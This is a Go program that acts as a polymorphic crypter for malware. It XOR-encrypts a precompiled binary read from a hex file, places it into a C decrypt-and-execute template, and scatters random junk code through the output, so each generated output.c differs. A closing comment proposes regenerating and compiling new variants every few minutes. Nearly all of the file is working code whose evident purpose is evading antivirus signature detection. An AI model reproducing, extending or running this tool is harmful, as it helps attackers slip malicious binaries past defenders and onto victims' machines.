package main

import (
    "math/rand"
    "time"
    "os"
    "log"
    "strconv"
    "strings"
)

//junk code that creates a bunch of strings inside a false if statement
func passiveif() string {
    rand.Seed(time.Now().UnixNano())
    character_set := "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890.-_"
    ammount_for_loop_to_loop := rand.Intn(17)
    var length_of_junk_string int
    if_statement_value := rand.Intn(16)
    junk_code_switch_picker := rand.Intn(2)
    the_junk_code := []string{}
    switch junk_code_switch_picker {
    case 0:
        the_junk_code = append(the_junk_code, " if(" + strconv.Itoa(if_statement_value) + " == " + strconv.Itoa(if_statement_value * 2) + "){\n")
    case 1:
        the_junk_code = append(the_junk_code, " if(" + strconv.Itoa(if_statement_value) + " != " + strconv.Itoa(if_statement_value) + "){\n")
    }
    for i := 0; i < ammount_for_loop_to_loop; i++ {
        length_of_junk_string = rand.Intn(513)
        the_junk_code = append(the_junk_code, "     char j" + strconv.FormatInt(time.Now().UnixNano(), 16) + "[" + strconv.Itoa(length_of_junk_string) + "] = \"")
        for j := 0; j < length_of_junk_string; j++ {
            the_junk_code = append(the_junk_code, string(character_set[rand.Intn(len(character_set))]))
        }
        the_junk_code = append(the_junk_code, "\";\n")
    }
    the_junk_code = append(the_junk_code, " }\n")
    return (strings.Join(the_junk_code, ""))
}

//junk code while loop that only runs once
func donothingwhileloopint() string {
    rand.Seed(time.Now().UnixNano())
    while_loop_num := time.Now().UnixNano()
    var while_loop_variable string
    for i := 0; i < 16; i++{
        while_loop_variable = while_loop_variable + string((rand.Intn(26) + 97))
    }
    the_junk_code := "long int " + while_loop_variable + " = " + strconv.FormatInt(while_loop_num, 10) + ";\n" + "  while(" + while_loop_variable + " < " + strconv.FormatInt(while_loop_num + 1, 10)  + ") {\n" + "    " + while_loop_variable + "++;\n" + "}\n"
    return the_junk_code
}

//random number put into switch statement that calls a function that returns junk code that this function returns
func junkcodetobeinsertedpicker() string {
    rand.Seed(time.Now().UnixNano())
    the_picker := rand.Intn(2)
    var junkcodetobereturned string
    switch the_picker {
    case 0:
        junkcodetobereturned = passiveif()
    case 1:
        junkcodetobereturned = donothingwhileloopint()
    }
    return junkcodetobereturned
}

func junkcodeinsert(content string) string {
    //splitting the string where //marker is
    code_chunks_to_modify := strings.Split(string(content), "//marker\n")
    //how many even numbers are there in code_chunks_to_modify
    slice_dimension := 0
    if len(code_chunks_to_modify)%2 == 0 {
    	slice_dimension = len(code_chunks_to_modify)/2
    }else{
    	slice_dimension = (len(code_chunks_to_modify)-1)/2
    }
    lines_of_code := make([][]string, slice_dimension)
    counter_for_2d_slice := 0
    //if the item is odd that means its inside the markers rather than outside of it meaning that we want to modify it
    for i := 0; i < len(code_chunks_to_modify); i++ {
        if i%2 != 0 {
            //splitting each line in the chunk of code into a seperate item
            split_code_chunk := strings.Split(code_chunks_to_modify[i], "\n")
            //adding the junk code
            for j := 0; j < len(split_code_chunk); j++ {
                lines_of_code[counter_for_2d_slice] = append(lines_of_code[counter_for_2d_slice], junkcodetobeinsertedpicker())
                lines_of_code[counter_for_2d_slice] = append(lines_of_code[counter_for_2d_slice], split_code_chunk[j])
            }
            counter_for_2d_slice++
        }
    }
    var modified_code [] string
    counter_for_2d_slice = 0
    for i := 0; i < len(code_chunks_to_modify); i++ {
        if i == (len(code_chunks_to_modify)-1){
        	modified_code = append(modified_code, code_chunks_to_modify[i])
        } else if i%2 == 0 {
            modified_code = append(modified_code, code_chunks_to_modify[i] + "//marker\n")
        } else {
            modified_code = append(modified_code, strings.Join(lines_of_code[counter_for_2d_slice], "\n") + "//marker\n")
            counter_for_2d_slice++
        }
    }
    return (strings.Join(modified_code, " "))
}

//converting hex to int 64 which will be converted to int
func converthex(input string) int64 {
    value, err := strconv.ParseInt(input, 16, 64)
    if err != nil {
        log.Fatal(err)
    }
    return value
}

//encrypting/encoding precompiled binary and generating decryption code that will have junk code added to it
func enccbeforejunk() string {
    //random key generation
    rand.Seed(time.Now().UnixNano())
		character_set := "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890.-_"
		min := 1
    max := 129
    key_len := rand.Intn(max - min) + min
    key := ""
    for j := 0; j < key_len; j++ {
    	key += string(character_set[rand.Intn(len(character_set))])
    }
    //hex dump of binary that will be executed in the c file that this is generating
    payload_from_file, err := os.ReadFile("payloadhex")
    if err != nil {
        log.Fatal(err)
    }
    //splitting into array of hex values
    payload_from_file_split := strings.Split(string(payload_from_file), ",")
    //initializing variables for payload and encryption key
		payload_output := "int enc_payload[] = {"
		key_output := "int key[] = {"
    //encrypting payload and adding everything to payload_output
    var payload_item_value int
		for i := 0; i < len(payload_from_file_split); i++ {
        payload_item_value = int(converthex(payload_from_file_split[i]))
				if(i < len(payload_from_file_split) - 1){
					payload_output += strconv.Itoa(int(payload_item_value) ^ int(key[i % key_len])) + ", "
				}else{
					payload_output += strconv.Itoa(int(payload_item_value) ^ int(key[i % key_len]))
				}
		}
    payload_output += "};"
    //converting key values to their ascii values in the form of a string and adding them to key_output
		for k := 0; k < key_len; k++ {
			if(k < key_len - 1){
				key_output += strconv.Itoa(int(key[k])) + ", "
			}else{
				key_output += strconv.Itoa(int(key[k]))
			}
		}
    key_output += "};"
    //final output will be the code for the decryptor code executor
    final_output := ""
    ctemplate, err := os.ReadFile("decrypt-exec")
    if err != nil {
        log.Fatal(err)
    }
    modified_ctemplate := strings.Split(string(ctemplate), "//var_position")
    final_output += modified_ctemplate[0] + payload_output + modified_ctemplate[1] + key_output + modified_ctemplate[2]
    return final_output
}

func main() {
	//this could be an infinite loop that creates new files and compiles them every few minutes
    output_file, err := os.Create("output.c")
    if err != nil {
        log.Fatal(err)
    }
    _, err2 := output_file.WriteString(junkcodeinsert(enccbeforejunk()))
    if err2 != nil {
        log.Fatal(err2)
    }
    output_file.Close()
}
